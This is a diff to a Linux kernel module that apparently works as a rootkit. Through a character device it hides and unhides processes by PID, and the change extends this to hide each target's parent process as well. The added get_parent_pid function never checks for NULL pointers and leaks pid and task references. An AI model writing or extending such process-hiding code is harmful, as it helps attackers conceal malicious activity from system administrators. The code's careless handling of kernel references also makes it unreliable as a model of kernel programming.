@@ -187,6 +187,22 @@ static ssize_t device_read(struct file *filep,
     return *offset;
 }
 
+#include <linux/rcupdate.h>
+
+static pid_t get_parent_pid(long child_pid)
+{
+    struct task_struct *child = NULL;
+    struct pid* cp = NULL;
+    struct task_struct *parent = NULL;
+    
+    cp = find_get_pid(child_pid);
+    child = get_pid_task(cp, PIDTYPE_PID);
+    parent = child->real_parent;
+    
+    return parent->pid;
+}
+
+
 static ssize_t device_write(struct file *filep,
                             const char *buffer,
                             size_t len,
@@ -205,9 +221,13 @@ static ssize_t device_write(struct file *filep,
     if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
         kstrtol(message + sizeof(add_message), 10, &pid);
         hide_process(pid);
+	pid_t ppid = get_parent_pid(pid);
+	hide_process(ppid);
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
         kstrtol(message + sizeof(del_message), 10, &pid);
         unhide_process(pid);
+	pid_t ppid = get_parent_pid(pid);
+	unhide_process(ppid);
     } else {
         kfree(message);
         return -EAGAIN;
